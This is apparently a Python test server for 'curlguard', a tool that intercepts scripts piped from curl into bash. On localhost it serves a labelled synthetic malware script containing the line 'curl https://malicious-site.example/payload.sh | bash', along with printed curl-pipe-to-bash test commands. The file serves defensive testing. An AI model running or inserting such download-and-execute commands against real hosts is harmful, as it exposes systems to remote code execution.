#!/usr/bin/env python3
"""Serve a synthetic malicious script for curlguard end-to-end testing."""

import http.server
import os
import socketserver
import threading
import time

PORT = 8888
TTL_SECONDS = 180

MALWARE_SCRIPT = b"""#!/bin/bash
# SYNTHETIC MALWARE SAMPLE FOR CURLGUARD TESTING ONLY
echo "Simulating a suspicious installer..."
curl https://malicious-site.example/payload.sh | bash
echo "If you see this, the downloaded script executed."
echo "If curlguard never showed a review prompt first, you were running plain curl instead of the wrapper."
echo "If curlguard did show Block first, the decision path failed to stop delivery."
"""


class ReusableTCPServer(socketserver.TCPServer):
    allow_reuse_address = True


class QuietHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        if self.path != "/test.sh":
            self.send_error(404)
            return

        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(MALWARE_SCRIPT)))
        self.end_headers()
        self.wfile.write(MALWARE_SCRIPT)

    def log_message(self, format: str, *args) -> None:
        return


def main() -> None:
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    with ReusableTCPServer(("127.0.0.1", PORT), QuietHandler) as listener:

        def expire() -> None:
            time.sleep(TTL_SECONDS)
            print(f"\n[Test server expired after {TTL_SECONDS} seconds]", flush=True)
            listener.shutdown()

        threading.Thread(target=expire, daemon=True).start()

        print(
            f"curlguard true-positive server is running on http://127.0.0.1:{PORT}",
            flush=True,
        )
        print("Serving: /test.sh", flush=True)
        print(
            "Expected result: curlguard opens an interactive review prompt.", flush=True
        )
        print(f"Server lifetime: {TTL_SECONDS} seconds", flush=True)
        print("", flush=True)
        print("Run in another terminal:", flush=True)
        print("  Installed curlguard:", flush=True)
        print("    curlguard http://127.0.0.1:8888/test.sh | bash", flush=True)
        print("  Optional shim, when explicitly activated:", flush=True)
        print("    curl http://127.0.0.1:8888/test.sh | bash", flush=True)
        print("  Repo-local dev run:", flush=True)
        print(
            "    PYTHONPATH=src python3 -m curlguard http://127.0.0.1:8888/test.sh | bash",
            flush=True,
        )
        print("", flush=True)
        print(
            "You should see curlguard messages before any script content reaches bash.",
            flush=True,
        )
        print("", flush=True)

        try:
            listener.serve_forever()
        except KeyboardInterrupt:
            pass


if __name__ == "__main__":
    main()
